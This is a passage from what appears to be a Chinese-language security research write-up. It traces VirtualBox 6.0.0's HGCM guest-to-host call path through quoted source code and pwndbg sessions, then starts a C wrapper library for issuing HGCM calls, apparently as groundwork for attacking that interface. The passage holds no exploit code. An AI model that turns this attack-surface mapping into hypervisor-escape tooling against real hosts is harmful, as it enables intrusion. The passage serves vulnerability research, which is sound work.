VMMDevReq_HGCMDisconnect:            vmmdevReqHdrSetHgcmAsyncExecute(pThis, GCPhysReqHdr, *ppLock);            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMDisconnect(pThis, pReqHdr, GCPhysReqHdr);            Assert(pReqHdr-&gt;rc == VINF_HGCM_ASYNC_EXECUTE || RT_FAILURE_NP(pReqHdr-&gt;rc));            if (RT_SUCCESS(pReqHdr-&gt;rc))                *pfPostOptimize |= VMMDEVREQDISP_POST_F_NO_WRITE_OUT;            break;# ifdef VBOX_WITH_64_BITS_GUESTS        case VMMDevReq_HGCMCall64:# endif        case VMMDevReq_HGCMCall32:            vmmdevReqHdrSetHgcmAsyncExecute(pThis, GCPhysReqHdr, *ppLock);            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMCall(pThis, pReqHdr, GCPhysReqHdr, tsArrival, ppLock);            Assert(pReqHdr-&gt;rc == VINF_HGCM_ASYNC_EXECUTE || RT_FAILURE_NP(pReqHdr-&gt;rc));            if (RT_SUCCESS(pReqHdr-&gt;rc))                *pfPostOptimize |= VMMDEVREQDISP_POST_F_NO_WRITE_OUT;            break;        case VMMDevReq_HGCMCancel:            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMCancel(pThis, pReqHdr, GCPhysReqHdr);            break;        case VMMDevReq_HGCMCancel2:            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMCancel2(pThis, pReqHdr);            break;#endif /* VBOX_WITH_HGCM */...........................................\n在VMMDevReq_HGCMConnect时，使用vmmdevReqHdrSetHgcmAsyncExecute函数设置异步返回值，这样Guset系统驱动的VbglR0HGCMInternalConnect函数时将通过pfnAsyncCallback(&amp;pHGCMConnect-&gt;header, pvAsyncData, u32AsyncData);等待设备这里的操作完成并获取结果；设备这里将调用vmmdevReqHandler_HGCMConnect连接HGCM服务，继续跟踪，\nvmmdevReqHandler_HGCMConnect/** Handle VMMDevHGCMConnect request. * * @param   pThis           The VMMDev instance data. * @param   pHGCMConnect    The guest request (cached in host memory). * @param   GCPhys          The physical address of the request. */int vmmdevHGCMConnect(PVMMDEV pThis, const VMMDevHGCMConnect *pHGCMConnect, RTGCPHYS GCPhys)&#123;    int rc = VINF_SUCCESS;    PVBOXHGCMCMD pCmd = vmmdevHGCMCmdAlloc(pThis, VBOXHGCMCMDTYPE_CONNECT, GCPhys, pHGCMConnect-&gt;header.header.size, 0,                                           pHGCMConnect-&gt;header.header.fRequestor);    if (pCmd)    &#123;        vmmdevHGCMConnectFetch(pHGCMConnect, pCmd);        /* Only allow the guest to use existing services! */        ASSERT_GUEST(pHGCMConnect-&gt;loc.type == VMMDevHGCMLoc_LocalHost_Existing);        pCmd-&gt;u.connect.pLoc-&gt;type = VMMDevHGCMLoc_LocalHost_Existing;        vmmdevHGCMAddCommand(pThis, pCmd);        rc = pThis-&gt;pHGCMDrv-&gt;pfnConnect(pThis-&gt;pHGCMDrv, pCmd, pCmd-&gt;u.connect.pLoc, &amp;pCmd-&gt;u.connect.u32ClientID);        if (RT_FAILURE(rc))            vmmdevHGCMRemoveCommand(pThis, pCmd);    &#125;    else    &#123;        rc = VERR_NO_MEMORY;    &#125;    return rc;&#125;\n函数中主要是调用了rc = pThis-&gt;pHGCMDrv-&gt;pfnConnect(pThis-&gt;pHGCMDrv, pCmd, pCmd-&gt;u.connect.pLoc, &amp;pCmd-&gt;u.connect.u32ClientID);进行服务连接，其中pThis在vmmdevIOPortRegionMap函数中初始化\nPVMMDEV pThis = RT_FROM_MEMBER(pPciDev, VMMDEV, PciDev);\npThis-&gt;pHGCMDrv在vmmdevConstruct函数中被初始化\npThis-&gt;pHGCMDrv = PDMIBASE_QUERY_INTERFACE(pThis-&gt;pDrvBase, PDMIHGCMCONNECTOR);\n通过调试，可以知道pThis-&gt;pHGCMDrv-&gt;pfnConnect最终指向的是iface_hgcmConnect函数\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Devices/VMMDev/VMMDevHGCM.cpp   450         /* Only allow the guest to use existing services! */   451         ASSERT_GUEST(pHGCMConnect-&gt;loc.type == VMMDevHGCMLoc_LocalHost_Existing);   452         pCmd-&gt;u.connect.pLoc-&gt;type = VMMDevHGCMLoc_LocalHost_Existing;   453    454         vmmdevHGCMAddCommand(pThis, pCmd); ► 455         rc = pThis-&gt;pHGCMDrv-&gt;pfnConnect(pThis-&gt;pHGCMDrv, pCmd, pCmd-&gt;u.connect.pLoc, &amp;pCmd-&gt;u.connect.u32ClientID);   456         if (RT_FAILURE(rc))   457             vmmdevHGCMRemoveCommand(pThis, pCmd);   458     &#125;   459     else   460     &#123;pwndbg&gt; s   599 /* HGCM connector interface */   600    601 static DECLCALLBACK(int) iface_hgcmConnect(PPDMIHGCMCONNECTOR pInterface, PVBOXHGCMCMD pCmd,   602                                            PHGCMSERVICELOCATION pServiceLocation,   603                                            uint32_t *pu32ClientID) ► 604 &#123;\n其中iface_hgcmConnect函数源码如下\niface_hgcmConnectstatic DECLCALLBACK(int) iface_hgcmConnect(PPDMIHGCMCONNECTOR pInterface, PVBOXHGCMCMD pCmd,                                           PHGCMSERVICELOCATION pServiceLocation,                                           uint32_t *pu32ClientID)&#123;    Log9((&quot;Enter\\n&quot;));    PDRVMAINVMMDEV pDrv = RT_FROM_MEMBER(pInterface, DRVMAINVMMDEV, HGCMConnector);    if (    !pServiceLocation        || (   pServiceLocation-&gt;type != VMMDevHGCMLoc_LocalHost            &amp;&amp; pServiceLocation-&gt;type != VMMDevHGCMLoc_LocalHost_Existing))    &#123;        return VERR_INVALID_PARAMETER;    &#125;    /* Check if service name is a string terminated by zero*/    size_t cchInfo = 0;    if (RTStrNLenEx(pServiceLocation-&gt;u.host.achName, sizeof(pServiceLocation-&gt;u.host.achName), &amp;cchInfo) != VINF_SUCCESS)    &#123;        return VERR_INVALID_PARAMETER;    &#125;    if (!pDrv-&gt;pVMMDev || !pDrv-&gt;pVMMDev-&gt;hgcmIsActive())        return VERR_INVALID_STATE;    return HGCMGuestConnect(pDrv-&gt;pHGCMPort, pCmd, pServiceLocation-&gt;u.host.achName, pu32ClientID);&#125;\n这里，对于pServiceLocation-&gt;type字段，其值必须为VMMDevHGCMLoc_LocalHost或者VMMDevHGCMLoc_LocalHost_Existing。检查通过以后，就会继续调用HGCMGuestConnect函数而HGCMGuestConnect函数是将数据封装为消息，然后调用hgcmMsgPost，hgcmMsgPost最后会调用hgcmMsgPostInternal函数向HGCMThread实例发送消息\nhgcmMsgPostInternalDECLINLINE(int) hgcmMsgPostInternal(HGCMMsgCore *pMsg, PHGCMMSGCALLBACK pfnCallback, bool fWait)&#123;    LogFlow((&quot;MAIN::hgcmMsgPostInternal: pMsg = %p, pfnCallback = %p, fWait = %d\\n&quot;, pMsg, pfnCallback, fWait));    Assert(pMsg);    pMsg-&gt;Reference(); /* paranoia? */    int rc = pMsg-&gt;Thread()-&gt;MsgPost(pMsg, pfnCallback, fWait);    pMsg-&gt;Dereference();    LogFlow((&quot;MAIN::hgcmMsgPostInternal: pMsg = %p, rc = %Rrc\\n&quot;, pMsg, rc));    return rc;&#125;\n通过gdb调试\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp   697     LogFlow((&quot;MAIN::hgcmMsgPostInternal: pMsg = %p, pfnCallback = %p, fWait = %d\\n&quot;, pMsg, pfnCallback, fWait));   698     Assert(pMsg);   699    700     pMsg-&gt;Reference(); /* paranoia? */   701  ► 702     int rc = pMsg-&gt;Thread()-&gt;MsgPost(pMsg, pfnCallback, fWait);   703    704     pMsg-&gt;Dereference();   705    706     LogFlow((&quot;MAIN::hgcmMsgPostInternal: pMsg = %p, rc = %Rrc\\n&quot;, pMsg, rc));   707     return rc;pwndbg&gt; p pMsg-&gt;Thread()-&gt;MsgPost$11 = &#123;int (HGCMThread * const, HGCMMsgCore *, PHGCMMSGCALLBACK, bool)&#125; 0x7fe5d8646a5c &lt;HGCMThread::MsgPost(HGCMMsgCore*, int (*)(int, HGCMMsgCore*), bool)&gt;\nHGCMThread::MsgPost函数只是简单的将消息插入到消息队列，当HGCMThread的线程取出消息时，便会进行处理。HGCMThread的主线程函数为hgcmThread\nhgcmThread/* The main HGCM thread handler. */static DECLCALLBACK(void) hgcmThread(HGCMThread *pThread, void *pvUser)&#123;    LogFlowFunc((&quot;pThread = %p, pvUser = %p\\n&quot;, pThread, pvUser));    NOREF(pvUser);    bool fQuit = false;    while (!fQuit)    &#123;        HGCMMsgCore *pMsgCore;        int rc = hgcmMsgGet(pThread, &amp;pMsgCore);        if (RT_FAILURE(rc))        &#123;            /* The error means some serious unrecoverable problem in the hgcmMsg/hgcmThread layer. */            AssertMsgFailed((&quot;%Rrc\\n&quot;, rc));            break;        &#125;        uint32_t u32MsgId = pMsgCore-&gt;MsgId();        switch (u32MsgId)        &#123;            case HGCM_MSG_CONNECT:            &#123;                HGCMMsgMainConnect *pMsg = (HGCMMsgMainConnect *)pMsgCore;                LogFlowFunc((&quot;HGCM_MSG_CONNECT pszServiceName %s, pu32ClientId %p\\n&quot;,                             pMsg-&gt;pszServiceName, pMsg-&gt;pu32ClientId));                /* Resolve the service name to the pointer to service instance.                 */                HGCMService *pService;                rc = HGCMService::ResolveService(&amp;pService, pMsg-&gt;pszServiceName);                if (RT_SUCCESS(rc))                &#123;                    /* Call the service instance method. */                    rc = pService-&gt;CreateAndConnectClient(pMsg-&gt;pu32ClientId,                                                          0,                                                          pMsg-&gt;pHGCMPort-&gt;pfnGetRequestor(pMsg-&gt;pHGCMPort, pMsg-&gt;pCmd),                                                          pMsg-&gt;pHGCMPort-&gt;pfnIsCmdRestored(pMsg-&gt;pHGCMPort, pMsg-&gt;pCmd));                    /* Release the service after resolve. */                    pService-&gt;ReleaseService();                &#125;            &#125; break;            case HGCM_MSG_DISCONNECT:            &#123;\n当收到HGCM_MSG_CONNECT消息时，调用HGCMService::ResolveService(&amp;pService, pMsg-&gt;pszServiceName)得到对应服务的句柄，该函数实际上就是一个链表查找的过程\n/** The method obtains a referenced pointer to the service with *  specified name. The caller must call ReleaseService when *  the pointer is no longer needed. * * @param ppSvc          Where to store the pointer to the service. * @param pszServiceName The name of the service. * @return VBox rc. * @thread main HGCM *//* static */ int HGCMService::ResolveService(HGCMService **ppSvc, const char *pszServiceName)&#123;    LogFlowFunc((&quot;ppSvc = %p name = %s\\n&quot;,                 ppSvc, pszServiceName));    if (!ppSvc || !pszServiceName)    &#123;        return VERR_INVALID_PARAMETER;    &#125;    HGCMService *pSvc = sm_pSvcListHead;    while (pSvc)    &#123;        if (strcmp(pSvc-&gt;m_pszSvcName, pszServiceName) == 0)        &#123;            break;        &#125;        pSvc = pSvc-&gt;m_pSvcNext;    &#125;    LogFlowFunc((&quot;lookup in the list is %p\\n&quot;, pSvc));    if (pSvc == NULL)    &#123;        *ppSvc = NULL;        return VERR_HGCM_SERVICE_NOT_FOUND;    &#125;    pSvc-&gt;ReferenceService();    *ppSvc = pSvc;    return VINF_SUCCESS;&#125;\n而该服务链表是在HGCM_MSG_LOAD时通过LoadService初始化的\ncase HGCM_MSG_LOAD:&#123;    HGCMMsgMainLoad *pMsg = (HGCMMsgMainLoad *)pMsgCore;    LogFlowFunc((&quot;HGCM_MSG_LOAD pszServiceName = %s, pMsg-&gt;pszServiceLibrary = %s, pMsg-&gt;pUVM = %p\\n&quot;,                 pMsg-&gt;pszServiceName, pMsg-&gt;pszServiceLibrary, pMsg-&gt;pUVM));    rc = HGCMService::LoadService(pMsg-&gt;pszServiceLibrary, pMsg-&gt;pszServiceName, pMsg-&gt;pUVM, pMsg-&gt;pHgcmPort);&#125; break;\n其中LoadService函数就是加载对应的名称的动态库，然后将句柄存储到链表中。ResolveService得到服务模块句柄以后，就通过CreateAndConnectClient函数调用模块中初始化的函数\nif (RT_SUCCESS(rc))&#123;    /* Call the service instance method. */    rc = pService-&gt;CreateAndConnectClient(pMsg-&gt;pu32ClientId,                                          0,                                          pMsg-&gt;pHGCMPort-&gt;pfnGetRequestor(pMsg-&gt;pHGCMPort, pMsg-&gt;pCmd),                                          pMsg-&gt;pHGCMPort-&gt;pfnIsCmdRestored(pMsg-&gt;pHGCMPort, pMsg-&gt;pCmd));    /* Release the service after resolve. */    pService-&gt;ReleaseService();&#125;\nCreateAndConnectClient函数如下\n/* Create a new client instance and connect it to the service. * * @param pu32ClientIdOut If not NULL, then the method must generate a new handle for the client. *                        If NULL, use the given &#x27;u32ClientIdIn&#x27; handle. * @param u32ClientIdIn   The handle for the client, when &#x27;pu32ClientIdOut&#x27; is NULL. * @param fRequestor      The requestor flags, VMMDEV_REQUESTOR_LEGACY if not available. * @param fRestoring      Set if we&#x27;re restoring a saved state. * @return VBox status code. */int HGCMService::CreateAndConnectClient(uint32_t *pu32ClientIdOut, uint32_t u32ClientIdIn, uint32_t fRequestor, bool fRestoring)&#123;    LogFlowFunc((&quot;pu32ClientIdOut = %p, u32ClientIdIn = %d, fRequestor = %#x, fRestoring = %d\\n&quot;,                 pu32ClientIdOut, u32ClientIdIn, fRequestor, fRestoring));    /* Allocate a client information structure. */    HGCMClient *pClient = new (std::nothrow) HGCMClient(fRequestor);    if (!pClient)    &#123;        Log1WarningFunc((&quot;Could not allocate HGCMClient!!!\\n&quot;));        return VERR_NO_MEMORY;    &#125;    uint32_t handle;    if (pu32ClientIdOut != NULL)    &#123;        handle = hgcmObjGenerateHandle(pClient);    &#125;    else    &#123;        handle = hgcmObjAssignHandle(pClient, u32ClientIdIn);    &#125;    LogFlowFunc((&quot;client id = %d\\n&quot;, handle));    AssertRelease(handle);    /* Initialize the HGCM part of the client. */    int rc = pClient-&gt;Init(this);    if (RT_SUCCESS(rc))    &#123;        /* Call the service. */        HGCMMsgCore *pCoreMsg;        rc = hgcmMsgAlloc(m_pThread, &amp;pCoreMsg, SVC_MSG_CONNECT, hgcmMessageAllocSvc);        if (RT_SUCCESS(rc))        &#123;            HGCMMsgSvcConnect *pMsg = (HGCMMsgSvcConnect *)pCoreMsg;            pMsg-&gt;u32ClientId = handle;            pMsg-&gt;fRequestor = fRequestor;            pMsg-&gt;fRestoring = fRestoring;            rc = hgcmMsgSend(pMsg);            if (RT_SUCCESS(rc))            &#123;                /* Add the client Id to the array. */                if (m_cClients == m_cClientsAllocated)                &#123;                    const uint32_t cDelta = 64;                    /* Guards against integer overflow on 32bit arch and also limits size of m_paClientIds array to 4GB*/                    if (m_cClientsAllocated &lt; UINT32_MAX / sizeof(m_paClientIds[0]) - cDelta)                    &#123;                        uint32_t *paClientIdsNew;                        paClientIdsNew = (uint32_t *)RTMemRealloc(m_paClientIds,                                                                  (m_cClientsAllocated + cDelta) * sizeof(m_paClientIds[0]));                        Assert(paClientIdsNew);                        if (paClientIdsNew)                        &#123;                            m_paClientIds = paClientIdsNew;                            m_cClientsAllocated += cDelta;                        &#125;                        else                        &#123;                            rc = VERR_NO_MEMORY;                        &#125;                    &#125;                    else                    &#123;                        rc = VERR_NO_MEMORY;                    &#125;                &#125;                m_paClientIds[m_cClients] = handle;                m_cClients++;            &#125;        &#125;    &#125;    if (RT_FAILURE(rc))    &#123;        hgcmObjDeleteHandle(handle);    &#125;    else    &#123;        if (pu32ClientIdOut != NULL)        &#123;            *pu32ClientIdOut = handle;        &#125;        ReferenceService();    &#125;    LogFlowFunc((&quot;rc = %Rrc\\n&quot;, rc));    return rc;&#125;\n可以知道，模块的id值最终被存入m_paClientIds[m_cClients]，同时通过 *pu32ClientIdOut = handle;将值返回。整个过程大概描述如下\nVBGL_IOCTL_HGCM_CALL在分析完VBGL_IOCTL_HGCM_CONNECT操作以后，接下来就是分析VBGL_IOCTL_HGCM_CALL，其路线与前面分析的类似，首先会将IOCTL传入的数据指针转为PVBGLIOCHGCMCALL类型\nPVBGLIOCHGCMCALL/** * For VBGL_IOCTL_HGCM_CALL and VBGL_IOCTL_HGCM_CALL_WITH_USER_DATA. * * @note This is used by alot of HGCM call structures. */typedef struct VBGLIOCHGCMCALL&#123;    /** Common header. */    VBGLREQHDR  Hdr;    /** Input: The id of the caller. */    uint32_t    u32ClientID;    /** Input: Function number. */    uint32_t    u32Function;    /** Input: How long to wait (milliseconds) for completion before cancelling the     * call.  This is ignored if not a VBGL_IOCTL_HGCM_CALL_TIMED or     * VBGL_IOCTL_HGCM_CALL_TIMED_32 request. */    uint32_t    cMsTimeout;    /** Input: Whether a timed call is interruptible (ring-0 only).  This is ignored     * if not a VBGL_IOCTL_HGCM_CALL_TIMED or VBGL_IOCTL_HGCM_CALL_TIMED_32     * request, or if made from user land. */    bool        fInterruptible;    /** Explicit padding, MBZ. */    uint8_t     bReserved;    /** Input: How many parameters following this structure.     *     * The parameters are either HGCMFunctionParameter64 or HGCMFunctionParameter32,     * depending on whether we&#x27;re receiving a 64-bit or 32-bit request.     *     * The current maximum is 61 parameters (given a 1KB max request size,     * and a 64-bit parameter size of 16 bytes).     *     * @note This information is duplicated by Hdr.cbIn, but it&#x27;s currently too much     *       work to eliminate this. */    uint16_t    cParms;    /* Parameters follow in form HGCMFunctionParameter aParms[cParms] */&#125; VBGLIOCHGCMCALL, RT_FAR *PVBGLIOCHGCMCALL;\n经过一些列调用，会来到vgdrvIoCtl_HGCMCallInner函数\nvgdrvIoCtl_HGCMCallInnerstatic int vgdrvIoCtl_HGCMCallInner(PVBOXGUESTDEVEXT pDevExt, PVBOXGUESTSESSION pSession, PVBGLIOCHGCMCALL pInfo,                                    uint32_t cMillies, bool fInterruptible, bool f32bit, bool fUserData,                                    size_t cbExtra, size_t cbData)&#123;    const uint32_t  u32ClientId = pInfo-&gt;u32ClientID;    uint32_t        fFlags;    size_t          cbActual;    unsigned        i;    int             rc;    /*     * Some more validations.     */    if (RT_LIKELY(pInfo-&gt;cParms &lt;= VMMDEV_MAX_HGCM_PARMS)) /* (Just make sure it doesn&#x27;t overflow the next check.) */    &#123; /* likely */&#125;    else    &#123;        LogRel((&quot;VBOXGUEST_IOCTL_HGCM_CALL: cParm=%RX32 is not sane\\n&quot;, pInfo-&gt;cParms));        return VERR_INVALID_PARAMETER;    &#125;    cbActual = cbExtra + sizeof(*pInfo);#ifdef RT_ARCH_AMD64    if (f32bit)        cbActual += pInfo-&gt;cParms * sizeof(HGCMFunctionParameter32);    else#endif        cbActual += pInfo-&gt;cParms * sizeof(HGCMFunctionParameter);    if (RT_LIKELY(cbData &gt;= cbActual))    &#123; /* likely */&#125;    else    &#123;        LogRel((&quot;VBOXGUEST_IOCTL_HGCM_CALL: cbData=%#zx (%zu) required size is %#zx (%zu)\\n&quot;,               cbData, cbData, cbActual, cbActual));        return VERR_INVALID_PARAMETER;    &#125;    pInfo-&gt;Hdr.cbOut = (uint32_t)cbActual; ........................................................        else            rc = VbglR0HGCMInternalCall(pInfo, cbInfo, fFlags, pSession-&gt;fRequestor,                                        vgdrvHgcmAsyncWaitCallback, pDevExt, cMillies);    &#125;.............................................................    return rc;&#125;\n从中可以看到cbActual += pInfo-&gt;cParms * sizeof(HGCMFunctionParameter);，并且该值最后赋值pInfo-&gt;Hdr.cbOut = (uint32_t)cbActual;，由此可见pInfo-&gt;cParms代表需要调用的函数的参数个数，而pInfo结构体下方就是cParms个HGCMFunctionParameter结构体对象。与VBGL_IOCTL_HGCM_CONNECT类似，最后驱动也是通过IO端口操作将数据发送到Host中的虚拟设备中，然后在设备的vmmdevReqDispatcher函数中处理。如下代码\n# ifdef VBOX_WITH_64_BITS_GUESTS        case VMMDevReq_HGCMCall64:# endif        case VMMDevReq_HGCMCall32:            vmmdevReqHdrSetHgcmAsyncExecute(pThis, GCPhysReqHdr, *ppLock);            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMCall(pThis, pReqHdr, GCPhysReqHdr, tsArrival, ppLock);            Assert(pReqHdr-&gt;rc == VINF_HGCM_ASYNC_EXECUTE || RT_FAILURE_NP(pReqHdr-&gt;rc));            if (RT_SUCCESS(pReqHdr-&gt;rc))                *pfPostOptimize |= VMMDEVREQDISP_POST_F_NO_WRITE_OUT;            break;\n该操作仍然是异步处理，需要等待处理完成后回调函数响应，将结果通过IO端口传回Guest。操作主要是调用vmmdevHGCMCall来对相应的service里的函数进行调用。\nvmmdevHGCMCall/** * Handles VMMDevHGCMCall request. * * @returns VBox status code that the guest should see. * @param   pThis           The VMMDev instance data. * @param   pHGCMCall       The request to handle (cached in host memory). * @param   cbHGCMCall      Size of the entire request (including HGCM parameters). * @param   GCPhys          The guest physical address of the request. * @param   enmRequestType  The request type. Distinguishes 64 and 32 bit calls. * @param   tsArrival       The STAM_GET_TS() value when the request arrived. * @param   ppLock          Pointer to the lock info pointer (latter can be *                          NULL).  Set to NULL if HGCM takes lock ownership. */int vmmdevHGCMCall(PVMMDEV pThis, const VMMDevHGCMCall *pHGCMCall, uint32_t cbHGCMCall, RTGCPHYS GCPhys,                   VMMDevRequestType enmRequestType, uint64_t tsArrival, PVMMDEVREQLOCK *ppLock)&#123;.............................................................        rc = vmmdevHGCMCallFetchGuestParms(pThis, pCmd, pHGCMCall, cbHGCMCall, enmRequestType, cbHGCMParmStruct);        if (RT_SUCCESS(rc))        &#123;            /* Copy guest data to host parameters, so HGCM services can use the data. */            rc = vmmdevHGCMInitHostParameters(pThis, pCmd, (uint8_t const *)pHGCMCall);            if (RT_SUCCESS(rc))            &#123;                /*                 * Pass the function call to HGCM connector for actual processing                 */                vmmdevHGCMAddCommand(pThis, pCmd);#if 0 /* DONT ENABLE - for performance hacking. */                if (    pCmd-&gt;u.call.u32Function == 9                    &amp;&amp;  pCmd-&gt;u.call.cParms      == 5)                &#123;                    vmmdevHGCMRemoveCommand(pThis, pCmd);                    if (pCmd-&gt;pvReqLocked)                    &#123;                        VMMDevHGCMRequestHeader volatile *pHeader = (VMMDevHGCMRequestHeader volatile *)pCmd-&gt;pvReqLocked;                        pHeader-&gt;header.rc = VINF_SUCCESS;                        pHeader-&gt;result    = VINF_SUCCESS;                        pHeader-&gt;fu32Flags |= VBOX_HGCM_REQ_DONE;                    &#125;                    else                    &#123;                        VMMDevHGCMRequestHeader *pHeader = (VMMDevHGCMRequestHeader *)pHGCMCall;                        pHeader-&gt;header.rc = VINF_SUCCESS;                        pHeader-&gt;result    = VINF_SUCCESS;                        pHeader-&gt;fu32Flags |= VBOX_HGCM_REQ_DONE;                        PDMDevHlpPhysWrite(pThis-&gt;pDevInsR3, GCPhys, pHeader,  sizeof(*pHeader));                    &#125;                    vmmdevHGCMCmdFree(pThis, pCmd);                    return VINF_HGCM_ASYNC_EXECUTE; /* ignored, but avoids assertions. */                &#125;#endif                rc = pThis-&gt;pHGCMDrv-&gt;pfnCall(pThis-&gt;pHGCMDrv, pCmd,                                              pCmd-&gt;u.call.u32ClientID, pCmd-&gt;u.call.u32Function,                                              pCmd-&gt;u.call.cParms, pCmd-&gt;u.call.paHostParms, tsArrival);...................................................    return rc;&#125;\n可以看出，vmmdevHGCMCall中首先是使用vmmdevHGCMCallFetchGuestParms函数和vmmdevHGCMInitHostParameters函数，将参数从Guest中拷贝到了设备本地缓冲区中，然后通过pThis-&gt;pHGCMDrv-&gt;pfnCall调用了对应的函数。通过调试\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Devices/VMMDev/VMMDevHGCM.cpp   1107                 &#125;   1108 #endif   1109    1110                 rc = pThis-&gt;pHGCMDrv-&gt;pfnCall(pThis-&gt;pHGCMDrv, pCmd,   1111                                               pCmd-&gt;u.call.u32ClientID, pCmd-&gt;u.call.u32Function, ► 1112                                               pCmd-&gt;u.call.cParms, pCmd-&gt;u.call.paHostParms, tsArrival);   1113    1114                 if (rc == VINF_HGCM_ASYNC_EXECUTE)   1115                 &#123;   1116                     /*   1117                      * Done.  Just update statistics and return.pwndbg&gt; s   638 &#125;   639    640 static DECLCALLBACK(int) iface_hgcmCall(PPDMIHGCMCONNECTOR pInterface, PVBOXHGCMCMD pCmd, uint32_t u32ClientID,   641                                         uint32_t u32Function, uint32_t cParms, PVBOXHGCMSVCPARM paParms, uint64_t tsArrival)\n可以知道该函数指针指向的是iface_hgcmCall函数\niface_hgcmCallstatic DECLCALLBACK(int) iface_hgcmCall(PPDMIHGCMCONNECTOR pInterface, PVBOXHGCMCMD pCmd, uint32_t u32ClientID,                                        uint32_t u32Function, uint32_t cParms, PVBOXHGCMSVCPARM paParms, uint64_t tsArrival)&#123;    Log9((&quot;Enter\\n&quot;));    PDRVMAINVMMDEV pDrv = RT_FROM_MEMBER(pInterface, DRVMAINVMMDEV, HGCMConnector);    if (!pDrv-&gt;pVMMDev || !pDrv-&gt;pVMMDev-&gt;hgcmIsActive())        return VERR_INVALID_STATE;    return HGCMGuestCall(pDrv-&gt;pHGCMPort, pCmd, u32ClientID, u32Function, cParms, paParms, tsArrival);&#125;\n该函数简单的调用了HGCMGuestCall函数，而HGCMGuestCall函数继续调用HGCMService::GuestCall函数，同样也是通过hgcmMsgPost将消息挂到队列中，等待hgcmServiceThread线程取出消息并处理。\n/* * The service thread. Loads the service library and calls the service entry points. */DECLCALLBACK(void) hgcmServiceThread(HGCMThread *pThread, void *pvUser)&#123;    HGCMService *pSvc = (HGCMService *)pvUser;    AssertRelease(pSvc != NULL);       /* Cache required information to avoid unnecessary pMsgCore access. */        uint32_t u32MsgId = pMsgCore-&gt;MsgId();        switch (u32MsgId)        &#123;           case SVC_MSG_GUESTCALL:            &#123;                HGCMMsgCall *pMsg = (HGCMMsgCall *)pMsgCore;                LogFlowFunc((&quot;SVC_MSG_GUESTCALL u32ClientId = %d, u32Function = %d, cParms = %d, paParms = %p\\n&quot;,                             pMsg-&gt;u32ClientId, pMsg-&gt;u32Function, pMsg-&gt;cParms, pMsg-&gt;paParms));                HGCMClient *pClient = (HGCMClient *)hgcmObjReference(pMsg-&gt;u32ClientId, HGCMOBJ_CLIENT);                if (pClient)                &#123;                    pSvc-&gt;m_fntable.pfnCall(pSvc-&gt;m_fntable.pvService, (VBOXHGCMCALLHANDLE)pMsg, pMsg-&gt;u32ClientId,                                            HGCM_CLIENT_DATA(pSvc, pClient), pMsg-&gt;u32Function,                                            pMsg-&gt;cParms, pMsg-&gt;paParms, pMsg-&gt;tsArrival);                    hgcmObjDereference(pClient);                &#125;                else                &#123;                    rc = VERR_HGCM_INVALID_CLIENT_ID;                &#125;            &#125; break;\n代码中，通过HGCMClient *pClient = (HGCMClient *)hgcmObjReference(pMsg-&gt;u32ClientId, HGCMOBJ_CLIENT);获取到了HGCMClient服务对象，然后通过pSvc-&gt;m_fntable.pfnCall进入了对应服务的处理函数。调试如下\nIn file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedClipboard/service.cpp   407                                    void *pvClient,   408                                    uint32_t u32Function,   409                                    uint32_t cParms,   410                                    VBOXHGCMSVCPARM paParms[],   411                                    uint64_t tsArrival) ► 412 &#123;   413     RT_NOREF_PV(tsArrival);   414     int rc = VINF_SUCCESS;   415    416     LogRel2((&quot;svcCall: u32ClientID = %d, fn = %d, cParms = %d, pparms = %d\\n&quot;,   417              u32ClientID, u32Function, cParms, paParms));\n此时我们进入的是 SharedClipboard服务的程序svcCall函数。对于HostServices目录下的各种服务都有一个svcCall函数的实现，由此可见，svcCall函数是服务程序的处理机入口。从代码可以看出这个函数是在VBoxHGCMSvcLoad中注册的\nextern &quot;C&quot; DECLCALLBACK(DECLEXPORT(int)) VBoxHGCMSvcLoad (VBOXHGCMSVCFNTABLE *ptable)&#123;    int rc = VINF_SUCCESS;            g_pHelpers = ptable-&gt;pHelpers;            ptable-&gt;cbClient = sizeof (VBOXCLIPBOARDCLIENTDATA);            ptable-&gt;pfnUnload     = svcUnload;            ptable-&gt;pfnConnect    = svcConnect;            ptable-&gt;pfnDisconnect = svcDisconnect;            ptable-&gt;pfnCall       = svcCall;            ptable-&gt;pfnHostCall   = svcHostCall;            ptable-&gt;pfnSaveState  = svcSaveState;            ptable-&gt;pfnLoadState  = svcLoadState;            ptable-&gt;pfnRegisterExtension  = svcRegisterExtension;            ptable-&gt;pfnNotify     = NULL;            ptable-&gt;pvService     = NULL;            /* Service specific initialization. */            rc = svcInit ();.................................................\n至此，我们对于VBGL_IOCTL_HGCM_CALL调用Service中的函数的整个流程也有所清楚了。\nVBGL_IOCTL_IDC_DISCONNECT对于VBGL_IOCTL_IDC_DISCONNECT，流程与前面类似，比较简单，调用了对应服务的DisconnectClient函数，然后使用hgcmObjDereference(pClient);将服务句柄从设备缓存列表中移除。\ncase HGCM_MSG_DISCONNECT:&#123;    HGCMMsgMainDisconnect *pMsg = (HGCMMsgMainDisconnect *)pMsgCore;    LogFlowFunc((&quot;HGCM_MSG_DISCONNECT u32ClientId = %d\\n&quot;,                 pMsg-&gt;u32ClientId));    HGCMClient *pClient = (HGCMClient *)hgcmObjReference(pMsg-&gt;u32ClientId, HGCMOBJ_CLIENT);    if (!pClient)    &#123;        rc = VERR_HGCM_INVALID_CLIENT_ID;        break;    &#125;    /* The service the client belongs to. */    HGCMService *pService = pClient-&gt;pService;    /* Call the service instance to disconnect the client. */    rc = pService-&gt;DisconnectClient(pMsg-&gt;u32ClientId, false);    hgcmObjDereference(pClient);&#125; break;\n至此，我们对HGCM协议已经有了进一步的深刻了解。\n0x02 HGCM调用库封装经过上面的协议源代码分析，我们可以很轻松的写出HGCM的调用方法，国外niklasb大牛已经做了一个python版的封装库名为3dpwn，而这里，我们自己同样实现了一个C语言版\nhgcm.h#ifndef HGM_HELPER_H#define HGM_HELPER_H#define VBGLREQHDR_VERSION 0x10001#define VBGLREQHDR_TYPE_DEFAULT 0#define VERR_INTERNAL_ERROR -225#define VBGL_IOCTL_CODE_SIZE(func, size) (0xc0005600 + (size&lt;&lt;16) + func)#define VBGL_IOCTL_HGCM_CONNECT                    